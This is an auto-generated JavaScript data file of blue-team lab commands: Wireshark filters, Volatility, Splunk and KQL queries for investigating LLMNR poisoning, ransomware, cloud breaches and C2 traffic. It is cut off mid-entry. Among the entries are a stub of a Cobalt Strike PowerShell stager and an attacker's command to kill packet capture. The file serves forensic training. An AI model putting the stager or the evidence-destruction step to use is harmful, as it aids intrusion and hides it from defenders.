// Auto-generated — do not edit manually
// Labs: python3 _labs/get_commands.py <labname>
// Wiki: python3 _labs/get_wiki_commands.py

const COMMANDS_DATA = [
  {
    "command": "ip.addr == 192.168.232.162 llmnr && ip.addr == 192.168.232.162",
    "tool": "wireshark",
    "lab": "PoisonedCredentials",
    "lab_url": "/blue-team/labs/poisonedcredentials/",
    "desc": "Filter Wireshark for LLMNR traffic from a specific host. Used to identify LLMNR poisoning attempts where an attacker responds to broadcast name resolution requests.",
    "tags": "wireshark llmnr poisoning broadcast name resolution"
  },
  {
    "command": "llmnr && ip.addr == 192.168.232.215",
    "tool": "wireshark",
    "lab": "PoisonedCredentials",
    "lab_url": "/blue-team/labs/poisonedcredentials/",
    "desc": "Isolate LLMNR packets from a specific IP. Useful for confirming which host is sending or responding to LLMNR queries during a poisoning investigation.",
    "tags": "wireshark llmnr poisoning responder"
  },
  {
    "command": "ntlmssp.auth.username && ip.addr == 192.168.232.215",
    "tool": "wireshark",
    "lab": "PoisonedCredentials",
    "lab_url": "/blue-team/labs/poisonedcredentials/",
    "desc": "Filter for NTLM authentication packets from a specific IP. Reveals usernames captured during NTLM relay or credential theft via LLMNR poisoning.",
    "tags": "wireshark ntlm credentials username authentication capture"
  },
  {
    "command": "./vol.py -f ../../Artifacts/Windows\\ 7\\ x64-Snapshot4.vmem windows.pstree.PsTree",
    "tool": "volatility",
    "lab": "amadey",
    "lab_url": "/blue-team/labs/amadey/",
    "desc": "Display process tree from a Windows 7 memory snapshot. Shows parent-child process relationships to identify unusual spawning chains.",
    "tags": "volatility process tree parent child hierarchy"
  },
  {
    "command": "./vol.py -f ../../Artifacts/Windows\\ 7\\ x64-Snapshot4.vmem cmdline",
    "tool": "volatility",
    "lab": "amadey",
    "lab_url": "/blue-team/labs/amadey/",
    "desc": "Extract command line arguments for all processes in the memory snapshot. Reveals execution parameters, paths, and flags used at runtime.",
    "tags": "volatility cmdline arguments execution parameters"
  },
  {
    "command": "./vol.py -f ../../Artifacts/Windows\\ 7\\ x64-Snapshot4.vmem windows.netscan.NetScan",
    "tool": "volatility",
    "lab": "amadey",
    "lab_url": "/blue-team/labs/amadey/",
    "desc": "Scan memory for active and closed network connections. Maps processes to remote IPs and ports to identify C2 communication.",
    "tags": "volatility network connections c2 ip port remote"
  },
  {
    "command": "`./vol.py -f ../../Artifacts/Windows\\ 7\\ x64-Snapshot4.vmem  windows.memmap.Memmap --pid 2748 --dump` strings pid.2748.dmp | grep -A 5 -i \"^get /\"",
    "tool": "volatility",
    "lab": "amadey",
    "lab_url": "/blue-team/labs/amadey/",
    "desc": "Dump memory for a specific PID then extract strings to find HTTP GET requests. Useful for recovering C2 URLs or download activity from a malicious process.",
    "tags": "volatility memmap dump strings http get url c2 pid"
  },
  {
    "command": "./vol.py -f ../../Artifacts/Windows\\ 7\\ x64-Snapshot4.vmem windows.filescan.FileScan > filescan.txt",
    "tool": "volatility",
    "lab": "amadey",
    "lab_url": "/blue-team/labs/amadey/",
    "desc": "Scan memory for file objects and redirect output to a text file. Saves results for grepping specific filenames and virtual addresses for later extraction.",
    "tags": "volatility filescan file objects virtual address output"
  },
  {
    "command": "http.request.method == \"GET\"",
    "tool": "wireshark",
    "lab": "danabot",
    "lab_url": "/blue-team/labs/danabot/",
    "desc": "Wireshark display filter for HTTP GET requests only. Useful for isolating download activity and C2 beacon traffic in a PCAP.",
    "tags": "wireshark http get request filter download"
  },
  {
    "command": "echo \"UGljYXNzb0JhZ3VldHRlOTk=\" | base64 -d",
    "tool": "shell",
    "lab": "lespion",
    "lab_url": "/blue-team/labs/lespion/",
    "desc": "Decode a base64 encoded string. Common technique for recovering obfuscated credentials, commands, or configuration data found in malware artifacts.",
    "tags": "shell base64 decode obfuscation credentials"
  },
  {
    "command": "index=* sourcetype=suricata eventtype=suricata_eve_ids_attack | stats values(dest_ip) values(http.http_user_agent) values(http.http_content_type) values(http.http_protocol) values(http.status) values(http.hostname) values(http.url) by src_ip",
    "tool": "splunk",
    "lab": "nerisbot",
    "lab_url": "/blue-team/labs/nerisbot/",
    "desc": "Aggregate Suricata IDS attack events by source IP. Collapses thousands of alerts into actionable rows showing user agents, hostnames, and URLs per attacker IP.",
    "tags": "splunk suricata ids aggregate stats src_ip user agent url hostname"
  },
  {
    "command": "index=* sourcetype=zeek:files tx_hosts=\"195.88.191.59\" | table _time md5 sha1 sha256",
    "tool": "splunk",
    "lab": "nerisbot",
    "lab_url": "/blue-team/labs/nerisbot/",
    "desc": "Pull all files transferred from a specific host using Zeek file logs. Returns timestamps and hashes for VirusTotal submission and IOC documentation.",
    "tags": "splunk zeek files hashes md5 sha1 sha256 tx_hosts download"
  },
  {
    "command": "index=* sourcetype=zeek:files tx_hosts=\"195.88.191.59\" | join left=L right=R where L.seen_bytes=R.bytes [search index=* sourcetype=suricata src_ip=147.32.84.165 dest_ip=195.88.191.59 url=*] | table L.md5, R.url",
    "tool": "splunk",
    "lab": "nerisbot",
    "lab_url": "/blue-team/labs/nerisbot/",
    "desc": "Correlate Zeek file hashes with Suricata HTTP URLs. Maps downloaded file hashes to the exact URLs they were retrieved from. Replace IPs as needed.",
    "tags": "splunk zeek suricata join correlate files url hash download"
  },
  {
    "command": "ntlmssp.challenge.target_name",
    "tool": "wireshark",
    "lab": "psexechunt",
    "lab_url": "/blue-team/labs/psexechunt/",
    "desc": "Filter for NTLM challenge packets containing the target domain or hostname. Helps identify the server being authenticated against during lateral movement.",
    "tags": "wireshark ntlm challenge target domain hostname lateral movement"
  },
  {
    "command": "ntlmssp.auth.username",
    "tool": "wireshark",
    "lab": "psexechunt",
    "lab_url": "/blue-team/labs/psexechunt/",
    "desc": "Filter for NTLM authentication packets to extract usernames. Identifies which accounts were used during PsExec or other remote execution activity.",
    "tags": "wireshark ntlm authentication username psexec lateral movement"
  },
  {
    "command": "smb2.tree",
    "tool": "wireshark",
    "lab": "psexechunt",
    "lab_url": "/blue-team/labs/psexechunt/",
    "desc": "Filter for SMB2 tree connect requests. Reveals which shares were accessed \u2014 ADMIN$, IPC$, or C$ connections are strong indicators of PsExec or remote service installation.",
    "tags": "wireshark smb2 tree share admin psexec remote execution"
  },
  {
    "command": "vol -f memory.dmp windows.netscan.NetScan",
    "tool": "volatility",
    "lab": "ramnit",
    "lab_url": "/blue-team/labs/ramnit/",
    "desc": "List active and closed network connections from memory. Used to identify C2 communication \u2014 maps process names and PIDs to remote IPs and ports.",
    "tags": "volatility netscan network connections c2 remote ip port"
  },
  {
    "command": "vol -f memory.dmp windows.filescan | grep \"ChromeSetup\"",
    "tool": "volatility",
    "lab": "ramnit",
    "lab_url": "/blue-team/labs/ramnit/",
    "desc": "Scan memory for file objects and filter by filename. Locates the virtual address of a specific file needed for extraction with dumpfiles.",
    "tags": "volatility filescan grep filename virtual address locate"
  },
  {
    "command": "vol -f memory.dmp windows.dumpfiles --virtaddr 0xca82b85325a0",
    "tool": "volatility",
    "lab": "ramnit",
    "lab_url": "/blue-team/labs/ramnit/",
    "desc": "Extract a specific file from memory using its virtual address obtained from filescan. Output file can then be hashed and submitted to VirusTotal.",
    "tags": "volatility dumpfiles extract virtaddr virtual address file"
  },
  {
    "command": "sha256sum file.0xca82b85325a0.0xca82b7e06c80.ImageSectionObject.ChromeSetup.exe.img sha1sum file.0xca82b85325a0.0xca82b7e06c80.ImageSectionObject.ChromeSetup.exe.img",
    "tool": "shell",
    "lab": "ramnit",
    "lab_url": "/blue-team/labs/ramnit/",
    "desc": "Hash a Volatility-extracted memory image file for VirusTotal submission. Volatility dumpfiles output uses this long naming convention \u2014 hash both SHA256 and SHA1.",
    "tags": "shell hash sha256 sha1 virustotal extracted memory image"
  },
  {
    "command": "python3 vol.py -f memory.dmp windows.psscan",
    "tool": "volatility",
    "lab": "volatilitytraces",
    "lab_url": "/blue-team/labs/volatilitytraces/",
    "desc": "Scan physical memory for process structures. Unlike pslist, catches hidden or terminated processes that have been unlinked from the standard process list.",
    "tags": "volatility psscan process scan physical memory hidden unlinked"
  },
  {
    "command": "python3 vol.py -f memory.dmp windows.cmdline",
    "tool": "volatility",
    "lab": "volatilitytraces",
    "lab_url": "/blue-team/labs/volatilitytraces/",
    "desc": "Extract full command line arguments for all processes. Reveals attacker intent \u2014 PowerShell flags, exclusion paths, and execution parameters are visible here.",
    "tags": "volatility cmdline arguments powershell parameters execution intent"
  },
  {
    "command": "python3 vol.py -f memory.dmp windows.getsids | grep -i powershell",
    "tool": "volatility",
    "lab": "volatilitytraces",
    "lab_url": "/blue-team/labs/volatilitytraces/",
    "desc": "Map processes to user accounts via SID, filtered for PowerShell. Links malicious process activity to a specific local or domain user account.",
    "tags": "volatility getsids sid user account privilege powershell attribution"
  },
  {
    "command": "http.request.method == \"POST\"",
    "tool": "wireshark",
    "lab": "webstrike",
    "lab_url": "/blue-team/labs/webstrike/",
    "desc": "Filter for HTTP POST requests in Wireshark. Useful for identifying form submissions, file uploads, exploit payloads, or data exfiltration over HTTP.",
    "tags": "wireshark http post request filter upload exfiltration"
  },
  {
    "command": "ip.addr == 117.11.88.124",
    "tool": "wireshark",
    "lab": "webstrike",
    "lab_url": "/blue-team/labs/webstrike/",
    "desc": "Filter all Wireshark traffic to or from a specific IP address. Used to isolate attacker traffic once a suspicious IP has been identified.",
    "tags": "wireshark ip filter isolate attacker traffic"
  },
  {
    "command": "`tcp.port == 8080`",
    "tool": "wireshark",
    "lab": "webstrike",
    "lab_url": "/blue-team/labs/webstrike/",
    "desc": "Filter traffic on a specific TCP port. Port 8080 is commonly used for alternative HTTP, web shells, or C2 callbacks to avoid standard port detection.",
    "tags": "wireshark tcp port 8080 http webshell c2 filter"
  },
  {
    "command": "smb2 && ip.addr == 172.16.66.1",
    "tool": "wireshark",
    "lab": "packetdetective",
    "lab_url": "/blue-team/labs/packetdetective/",
    "desc": "Filter SMB2 traffic to identify files written by attacker IP, revealing remote execution via PSEXESVC.exe",
    "tags": "wireshark"
  },
  {
    "command": "http && ip.addr == 23.158.56.196 && http.request.method == \"POST\"",
    "tool": "wireshark",
    "lab": "jetbrains",
    "lab_url": "/blue-team/labs/jetbrains/",
    "desc": "Filter HTTP POST requests from attacker IP to identify webshell uploads and command execution activity",
    "tags": "wireshark"
  },
  {
    "command": "http && ip.addr == 111.224.180.128 and frame contains \"lqkctf24s9h9lg67teu8uevn3q\"",
    "tool": "wireshark",
    "lab": "retailbreach",
    "lab_url": "/blue-team/labs/retailbreach/",
    "desc": "Filter attacker traffic containing the stolen session cookie to confirm hijacked session usage",
    "tags": "wireshark"
  },
  {
    "command": "ip.addr==10.0.2.4 && smb2",
    "tool": "wireshark",
    "lab": "lockdown",
    "lab_url": "/blue-team/labs/lockdown/",
    "desc": "Filter SMB2 traffic from attacker IP to identify share enumeration and file upload activity",
    "tags": "wireshark"
  },
  {
    "command": "vol -f memdump.mem windows.info",
    "tool": "volatility",
    "lab": "lockdown",
    "lab_url": "/blue-team/labs/lockdown/",
    "desc": "Dump system information from memory image including kernel base address and OS version",
    "tags": "volatility"
  },
  {
    "command": "vol -f memdump.mem windows.pstree",
    "tool": "volatility",
    "lab": "lockdown",
    "lab_url": "/blue-team/labs/lockdown/",
    "desc": "Display running process tree from memory to identify suspicious parent-child relationships and injected processes",
    "tags": "volatility"
  },
  {
    "command": "vol -f memdump.mem windows.cmdline",
    "tool": "volatility",
    "lab": "lockdown",
    "lab_url": "/blue-team/labs/lockdown/",
    "desc": "Extract full command line arguments for all running processes to identify malicious execution paths and persistence mechanisms",
    "tags": "volatility"
  },
  {
    "command": "index=* \"userIdentity.userName\"=\"helpdesk.luke\" eventName=GetObject | stats min(_time) as first_access_timestamp",
    "tool": "splunk",
    "lab": "awsraid",
    "lab_url": "/blue-team/labs/awsraid/",
    "desc": "Find the earliest S3 GetObject event for a specific IAM user \u2014 returns first access timestamp as epoch",
    "tags": "splunk"
  },
  {
    "command": "index=\"aws_cloudtrail\" \"userIdentity.userName\"=\"helpdesk.luke\" eventSource=\"s3.amazonaws.com\" eventName=\"GetObject\" | table _time, eventName, requestParameters.bucketName, requestParameters.key",
    "tool": "splunk",
    "lab": "awsraid",
    "lab_url": "/blue-team/labs/awsraid/",
    "desc": "List all S3 objects accessed by a specific IAM user \u2014 shows bucket name and object key per event",
    "tags": "splunk"
  },
  {
    "command": "index=\"aws_cloudtrail\" \"userIdentity.userName\"=\"helpdesk.luke\" eventName=PutBucketPublicAccessBlock | stats count by requestParameters.bucketName",
    "tool": "splunk",
    "lab": "awsraid",
    "lab_url": "/blue-team/labs/awsraid/",
    "desc": "Detect S3 bucket public access block modifications by a specific user \u2014 attacker staging data for public exfiltration",
    "tags": "splunk"
  },
  {
    "command": "`index=\"aws_cloudtrail\" \"userIdentity.userName\"=\"helpdesk.luke\" eventCategory=\"Management\" | search eventName=\"CreateUser\" OR eventName=\"CreateLoginProfile\"| table _time, eventName, requestParameters.userName`",
    "tool": "splunk",
    "lab": "awsraid",
    "lab_url": "/blue-team/labs/awsraid/",
    "desc": "Hunt for IAM backdoor account creation \u2014 finds CreateUser and CreateLoginProfile events used to establish persistence",
    "tags": "splunk"
  },
  {
    "command": "index=\"aws_cloudtrail\" \"userIdentity.userName\"=\"helpdesk.luke\" eventName=AddUserToGroup | stats count by requestParameters.groupName",
    "tool": "splunk",
    "lab": "awsraid",
    "lab_url": "/blue-team/labs/awsraid/",
    "desc": "Identify group membership changes made by a compromised IAM user \u2014 detects privilege escalation via admin group assignment",
    "tags": "splunk"
  },
  {
    "command": "ip.addr == 185.220.101.50 and tcp.port == 4444",
    "tool": "wireshark",
    "lab": "redishell",
    "lab_url": "/blue-team/labs/redishell/",
    "desc": "Filter Wireshark to isolate reverse shell traffic between victim and C2 on port 4444 for TCP stream reconstruction",
    "tags": "wireshark"
  },
  {
    "command": "kill -9 24918",
    "tool": "shell",
    "lab": "redishell",
    "lab_url": "/blue-team/labs/redishell/",
    "desc": "kill -9 24918 Attacker terminates active tcpdump process to stop network capture and destroy forensic evidence",
    "tags": "shell"
  },
  {
    "command": "cat * | grep -c \"https://cdn.discordapp.com/\"",
    "tool": "shell",
    "lab": "foxy",
    "lab_url": "/blue-team/labs/foxy/",
    "desc": "Count occurrences of a string across all files in a directory. -c returns a line count per file rather than the matching lines themselves.",
    "tags": "shell"
  },
  {
    "command": "index=* src_ip=\"218.92.0.204\" | stats count by http_request_uri | sort -count",
    "tool": "splunk",
    "lab": "middlemayhem",
    "lab_url": "/blue-team/labs/middlemayhem/",
    "desc": "Count and rank unique URIs accessed by attacker IP to measure scan scope",
    "tags": "splunk"
  },
  {
    "command": "index=* src_ip=\"<webserver_ip>\" dest_port=22 | stats count by dest_ip | sort -count",
    "tool": "splunk",
    "lab": "middlemayhem",
    "lab_url": "/blue-team/labs/middlemayhem/",
    "desc": "Identify internal hosts targeted by SSH brute-force from compromised web server",
    "tags": "splunk"
  },
  {
    "command": "index=* User=\"CYBERRANGE\\\\ricksanchez\" \"schtasks.exe\"",
    "tool": "splunk",
    "lab": "splunkit",
    "lab_url": "/blue-team/labs/splunkit/",
    "desc": "Hunt scheduled task creation by a specific user. Useful for detecting persistence via schtasks.exe under a compromised account.",
    "tags": "splunk"
  },
  {
    "command": "index=* User=\"CYBERRANGE\\\\ricksanchez\" \".ps1\"",
    "tool": "splunk",
    "lab": "splunkit",
    "lab_url": "/blue-team/labs/splunkit/",
    "desc": "Hunt PowerShell script execution by a specific user. Useful for detecting malicious .ps1 activity under a compromised account.",
    "tags": "splunk"
  },
  {
    "command": "tcp.flags.syn == 1 && tcp.flags.ack == 1",
    "tool": "wireshark",
    "lab": "xxeinfiltration",
    "lab_url": "/blue-team/labs/xxeinfiltration/",
    "desc": "Filter for completed TCP handshakes (SYN-ACK). Used to identify open ports on a target during attacker reconnaissance.",
    "tags": "wireshark"
  },
  {
    "command": "mysql.login_request",
    "tool": "wireshark",
    "lab": "xxeinfiltration",
    "lab_url": "/blue-team/labs/xxeinfiltration/",
    "desc": "Filter for MySQL login attempts in a PCAP. Used to identify credential-based database access following credential theft.",
    "tags": "wireshark"
  },
  {
    "command": "index=revil \"event.code\"=11 \"readme\"",
    "tool": "splunk",
    "lab": "revil_gold",
    "lab_url": "/blue-team/labs/revil_gold/",
    "desc": "Hunt for ransom note file creation via Sysmon Event ID 11. Filtering on 'readme' identifies ransomware-dropped notes and surfaces the responsible process ID and executable path.",
    "tags": "splunk"
  },
  {
    "command": "index=revil powershell.exe \"event.code\"=1",
    "tool": "splunk",
    "lab": "revil_gold",
    "lab_url": "/blue-team/labs/revil_gold/",
    "desc": "Hunt for PowerShell process execution via Sysmon Event ID 1. Used to identify obfuscated commands such as Base64-encoded shadow copy deletion during ransomware investigations.",
    "tags": "splunk"
  },
  {
    "command": "index=revil event.code=1 \"facebook assistant.exe\" | table winlog.event_data.Hashes",
    "tool": "splunk",
    "lab": "revil_gold",
    "lab_url": "/blue-team/labs/revil_gold/",
    "desc": "Extract all hashes logged by Sysmon for a specific executable at process creation. Returns SHA256, MD5, SHA1 and IMPHASH for immediate threat intel cross-referencing.",
    "tags": "splunk"
  },
  {
    "command": "exiftool image.jpg",
    "tool": "shell",
    "lab": "shibainsider",
    "lab_url": "/blue-team/labs/shibainsider/",
    "desc": "Extract metadata from image file to identify embedded technique hints",
    "tags": "shell"
  },
  {
    "command": "steghide extract -sf image.jpg",
    "tool": "shell",
    "lab": "shibainsider",
    "lab_url": "/blue-team/labs/shibainsider/",
    "desc": "Extract hidden data from steganographic image using steghide",
    "tags": "shell"
  },
  {
    "command": "exiftool uploaded_1.JPG | grep -i \"date\" exiftool uploaded_1.JPG | grep -i \"comment\"",
    "tool": "shell",
    "lab": "meta",
    "lab_url": "/blue-team/labs/meta/",
    "desc": "Extract metadata from image file to identify embedded technique hints",
    "tags": "shell"
  },
  {
    "command": "tcp.port == 14693",
    "tool": "wireshark",
    "lab": "exxtensity",
    "lab_url": "/blue-team/labs/exxtensity/",
    "desc": "Filter traffic on non-standard port 14693 keylogger exfil port in Exxtensity",
    "tags": "wireshark"
  },
  {
    "command": "vol -f MemoryDump.mem windows.pstree",
    "tool": "volatility",
    "lab": "redline",
    "lab_url": "/blue-team/labs/redline/",
    "desc": "Display running processes as parent/child tree to identify anomalous spawning relationships",
    "tags": "volatility"
  },
  {
    "command": "vol -f MemoryDump.mem windows.pslist",
    "tool": "volatility",
    "lab": "redline",
    "lab_url": "/blue-team/labs/redline/",
    "desc": "List all running processes from memory with PID, PPID, start time",
    "tags": "volatility"
  },
  {
    "command": "vol -f MemoryDump.mem windows.malfind",
    "tool": "volatility",
    "lab": "redline",
    "lab_url": "/blue-team/labs/redline/",
    "desc": "Scan memory regions for injected code \u2014 flags PAGE_EXECUTE_READWRITE and suspicious VAD entries",
    "tags": "volatility"
  },
  {
    "command": "vol -f MemoryDump.mem windows.netscan",
    "tool": "volatility",
    "lab": "redline",
    "lab_url": "/blue-team/labs/redline/",
    "desc": "Enumerate active and recently closed network connections from memory",
    "tags": "volatility"
  },
  {
    "command": "strings -el MemoryDump.mem | grep \"\\.php\" | sort -u",
    "tool": "shell",
    "lab": "redline",
    "lab_url": "/blue-team/labs/redline/",
    "desc": "Extract UTF-16 wide strings from memory dump and filter for PHP endpoints \u2014 catches .NET malware C2 URLs",
    "tags": "shell"
  },
  {
    "command": "vol -f MemoryDump.mem windows.filescan | grep -i oneetx.exe",
    "tool": "volatility",
    "lab": "redline",
    "lab_url": "/blue-team/labs/redline/",
    "desc": "can memory for file handles and filter by name to recover full on-disk path of a malicious executable",
    "tags": "volatility"
  },
  {
    "command": "EvtxECmd.exe -f \"C:\\Users\\Administrator\\Desktop\\Start Here\\Artifacts\\PC\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-Sysmon%4Operational.evtx\" --csv \"C:\\Temp\" --csvf sysmon.csv",
    "tool": "shell",
    "lab": "revengehotels",
    "lab_url": "/blue-team/labs/revengehotels/",
    "desc": "Export Windows event log to CSV for proper Timeline Explorer analysis \u2014 raw evtx renders unreadable without Sysmon installed on analysis host",
    "tags": "shell"
  },
  {
    "command": "ip.addr == 192.168.90.5 && http.request.method == POST",
    "tool": "wireshark",
    "lab": "winterstew",
    "lab_url": "/blue-team/labs/winterstew/",
    "desc": "Filter HTTP POST requests from a specific host \u2014 used to extract login credentials submitted via web forms",
    "tags": "wireshark"
  },
  {
    "command": "http.response.code == 302",
    "tool": "wireshark",
    "lab": "winterstew",
    "lab_url": "/blue-team/labs/winterstew/",
    "desc": "Filter HTTP 302 redirect responses \u2014 identifies successful logins and post-authentication redirects",
    "tags": "wireshark"
  },
  {
    "command": "search * | distinct $table | order by $table asc",
    "tool": "kql",
    "lab": "rogueazure",
    "lab_url": "/blue-team/labs/rogueazure/",
    "desc": "KQL: discover all available tables in the Sentinel workspace \u2014 run first on any new lab to confirm table names before writing queries",
    "tags": "kql"
  },
  {
    "command": "InteractiveSignIns_CL | where Status == \"Failure\" | summarize FailedAttempts = count(), TargetUsers = dcount(Username) by IPAddress | order by FailedAttempts desc",
    "tool": "kql",
    "lab": "rogueazure",
    "lab_url": "/blue-team/labs/rogueazure/",
    "desc": "KQL: detect password spray \u2014 count failures and distinct target users per IP, high TargetUsers from single IP = spray pattern",
    "tags": "kql"
  },
  {
    "command": "InteractiveSignIns_CL | where IPAddress == \"52.59.240.166\" | where Status == \"Success\" | project EventTime, Username, IPAddress, Status | order by EventTime asc",
    "tool": "kql",
    "lab": "rogueazure",
    "lab_url": "/blue-team/labs/rogueazure/",
    "desc": "KQL: confirm successful logins from a known spray IP to identify the first compromised account",
    "tags": "kql"
  },
  {
    "command": "InteractiveSignIns_CL | where Username == \"mharmon@compliantsecure.store\" | where Status == \"Success\" | project EventTime, Username, IPAddress, Status, Location | order by EventTime asc",
    "tool": "kql",
    "lab": "rogueazure",
    "lab_url": "/blue-team/labs/rogueazure/",
    "desc": "KQL: track all successful logins for a compromised account \u2014 reveals IP pivot and geolocation changes post-compromise",
    "tags": "kql"
  },
  {
    "command": "AuditLogs_CL | where EventTime >= datetime(2025-11-14) | where ActorUserPrincipalName == \"mharmon@compliantsecure.store\" | project EventTime, Activity, ActorUserPrincipalName, Target1DisplayName, IPAddress | order by EventTime asc",
    "tool": "kql",
    "lab": "rogueazure",
    "lab_url": "/blue-team/labs/rogueazure/",
    "desc": "KQL: full post-exploitation audit trail for a compromised account \u2014 surfaces app registrations, role assignments, and all admin actions after breach",
    "tags": "kql"
  },
  {
    "command": "AuditLogs_CL | where Activity == \"Add member to role\" | where EventTime >= datetime(2025-11-14) | project EventTime, ActorUserPrincipalName, Target1DisplayName, TargetUserPrincipalName, NewRule, IPAddress | order by EventTime asc",
    "tool": "kql",
    "lab": "rogueazure",
    "lab_url": "/blue-team/labs/rogueazure/",
    "desc": "KQL: identify privilege escalation \u2014 shows role assignments made by the attacker including Global Administrator grants",
    "tags": "kql"
  },
  {
    "command": "StorageBlobLogs_CL | where TimeGenerated >= datetime(2025-11-14) | where OperationName == \"GetBlob\" | project TimeGenerated, AccountName, Uri, CallerIpAddress, OperationName | order by TimeGenerated asc",
    "tool": "kql",
    "lab": "rogueazure",
    "lab_url": "/blue-team/labs/rogueazure/",
    "desc": "KQL: detect data exfiltration from Azure Blob Storage \u2014 GetBlob operations show files downloaded and the caller IP",
    "tags": "kql"
  },
  {
    "command": "ip.addr == 10.0.2.5 && smb2",
    "tool": "wireshark",
    "lab": "print",
    "lab_url": "/blue-team/labs/print/",
    "desc": "Filter SMB2 traffic from attacker IP to identify malicious file transfers",
    "tags": "wireshark"
  },
  {
    "command": "Get-Content .\\sh4 -Stream Zone.Identifier",
    "tool": "powershell",
    "lab": "indicators",
    "lab_url": "/blue-team/labs/indicators/",
    "desc": "Read NTFS Zone Identifier stream to determine file download origin URL",
    "tags": "powershell"
  },
  {
    "command": "Get-FileHash .\\sh4",
    "tool": "powershell",
    "lab": "indicators",
    "lab_url": "/blue-team/labs/indicators/",
    "desc": "Calculate SHA256 hash of file for threat intelligence enrichment",
    "tags": "powershell"
  },
  {
    "command": "index=* eventSource=\"s3.amazonaws.com\" eventName=\"GetObject\" | table eventTime, sourceIPAddress, requestParameters.bucketName, requestParameters.key, userAgent",
    "tool": "splunk",
    "lab": "spilledbucket",
    "lab_url": "/blue-team/labs/spilledbucket/",
    "desc": "CloudTrail: query S3 GetObject events to identify attacker IP, bucket name, and downloaded file",
    "tags": "splunk"
  },
  {
    "command": "index=* dstport=51820 | table start, srcaddr, dstaddr, dstport, protocol | sort start",
    "tool": "splunk",
    "lab": "spilledbucket",
    "lab_url": "/blue-team/labs/spilledbucket/",
    "desc": "VPC Flow Logs: find WireGuard connections on UDP 51820 to identify attacker IP and target EC2",
    "tags": "splunk"
  },
  {
    "command": "index=* eventName=\"AssumeRole\" sourceIPAddress!=\"resource-explorer-2.amazonaws.com\" | table eventTime, sourceIPAddress, requestParameters.roleArn | sort eventTime",
    "tool": "splunk",
    "lab": "spilledbucket",
    "lab_url": "/blue-team/labs/spilledbucket/",
    "desc": "CloudTrail: find AssumeRole events excluding AWS service noise to identify attacker role assumption",
    "tags": "splunk"
  },
  {
    "command": "index=* eventSource=\"iam.amazonaws.com\" \"i-00eda415438b3d90c\" | table eventTime, eventName, requestParameters | sort eventTime",
    "tool": "splunk",
    "lab": "spilledbucket",
    "lab_url": "/blue-team/labs/spilledbucket/",
    "desc": "CloudTrail: query IAM events tied to compromised instance ID to surface enumeration and persistence actions",
    "tags": "splunk"
  },
  {
    "command": "index=* dstport=22 | table start, srcaddr, dstaddr, dstport | sort start",
    "tool": "splunk",
    "lab": "spilledbucket",
    "lab_url": "/blue-team/labs/spilledbucket/",
    "desc": "VPC Flow Logs: identify SSH lateral movement by filtering inbound connections on port 22",
    "tags": "splunk"
  },
  {
    "command": "index=* srcaddr=\"10.0.2.32\" protocol=6 | stats count by dstaddr, dstport | sort -count",
    "tool": "splunk",
    "lab": "spilledbucket",
    "lab_url": "/blue-team/labs/spilledbucket/",
    "desc": "VPC Flow Logs: find outbound TCP connections from compromised EC2 to identify reverse shell C2 IP and port",
    "tags": "splunk"
  },
  {
    "command": "ip.src == 192.168.100.97 && http",
    "tool": "wireshark",
    "lab": "multistages",
    "lab_url": "/blue-team/labs/multistages/",
    "desc": "Wireshark: filter HTTP traffic from attacker IP to identify Cobalt Strike beacon URIs and encoded cookie data",
    "tags": "wireshark"
  },
  {
    "command": "ip.src == 192.168.100.100 && http.request.method == \"GET\"",
    "tool": "wireshark",
    "lab": "multistages",
    "lab_url": "/blue-team/labs/multistages/",
    "desc": "Wireshark: filter outbound GET requests from victim to identify C2 staging URL and payload delivery",
    "tags": "wireshark"
  },
  {
    "command": "python3 vol.py -f ../../Investigation\\ Files/memdump.raw windows.cmdline",
    "tool": "volatility",
    "lab": "multistages",
    "lab_url": "/blue-team/labs/multistages/",
    "desc": "Volatility: dump full process command lines to identify malicious PowerShell download cradle",
    "tags": "volatility"
  },
  {
    "command": "python3 vol.py -f ../../Investigation\\ Files/memdump.raw windows.cmdline | grep \"powershell\\|rundll32\\|explorer\"",
    "tool": "volatility",
    "lab": "multistages",
    "lab_url": "/blue-team/labs/multistages/",
    "desc": "Volatility: filter cmdline output for key processes to map the attack execution chain",
    "tags": "volatility"
  },
  {
    "command": "python3 vol.py -f ../../Investigation\\ Files/memdump.raw windows.pstree",
    "tool": "volatility",
    "lab": "multistages",
    "lab_url": "/blue-team/labs/multistages/",
    "desc": "Volatility: display process tree to identify parent-child injection chain across four stages",
    "tags": "volatility"
  },
  {
    "command": "python3 vol.py -f ../../Investigation\\ Files/memdump.raw windows.netscan",
    "tool": "volatility",
    "lab": "multistages",
    "lab_url": "/blue-team/labs/multistages/",
    "desc": "Volatility: scan network artifacts in memory to confirm beacon process PID actively connecting to C2 on port 80",
    "tags": "volatility"
  },
  {
    "command": "python3 vol.py -f ../../Investigation\\ Files/memdump.raw windows.malfind | grep -i \"PAGE_EXECUTE_READWRITE\"",
    "tool": "volatility",
    "lab": "multistages",
    "lab_url": "/blue-team/labs/multistages/",
    "desc": "Volatility: detect injected memory regions with RWX permissions indicating shellcode injection into legitimate processes",
    "tags": "volatility"
  },
  {
    "command": "python3 vol.py -f ../../Investigation\\ Files/memdump.raw windows.hivelist",
    "tool": "volatility",
    "lab": "multistages",
    "lab_url": "/blue-team/labs/multistages/",
    "desc": "Volatility: list registry hives in memory to locate SYSTEM hive offset for key extraction",
    "tags": "volatility"
  },
  {
    "command": "python3 vol.py -f ../../Investigation\\ Files/memdump.raw windows.registry.printkey --offset 0xf8a0007b010 --key \"Microsoft\\Cryptography\"",
    "tool": "volatility",
    "lab": "multistages",
    "lab_url": "/blue-team/labs/multistages/",
    "desc": "Volatility: extract MachineGuid from registry hive to identify unique Windows endpoint identifier",
    "tags": "volatility"
  },
  {
    "command": "$s=New-Object IO.MemoryStream([Convert]::FromBase64String(\"...\"))",
    "tool": "powershell",
    "lab": "multistages",
    "lab_url": "/blue-team/labs/multistages/",
    "desc": "Cobalt Strike stager response \u2014 reflective DLL loader delivered as base64-encoded blob via PowerShell MemoryStream",
    "tags": "powershell"
  },
  {
    "command": "aureport -if audit.log --summary",
    "tool": "shell",
    "lab": "paranoid",
    "lab_url": "/blue-team/labs/paranoid/",
    "desc": "Generate a summary report from a specified audit log file",
    "tags": "shell"
  },
  {
    "command": "aureport -if audit.log --login --failed",
    "tool": "shell",
    "lab": "paranoid",
    "lab_url": "/blue-team/labs/paranoid/",
    "desc": "List failed login attempts from a specified audit log file",
    "tags": "shell"
  },
  {
    "command": "aureport -if audit.log --login --success",
    "tool": "shell",
    "lab": "paranoid",
    "lab_url": "/blue-team/labs/paranoid/",
    "desc": "List successful logins from a specified audit log file",
    "tags": "shell"
  },
  {
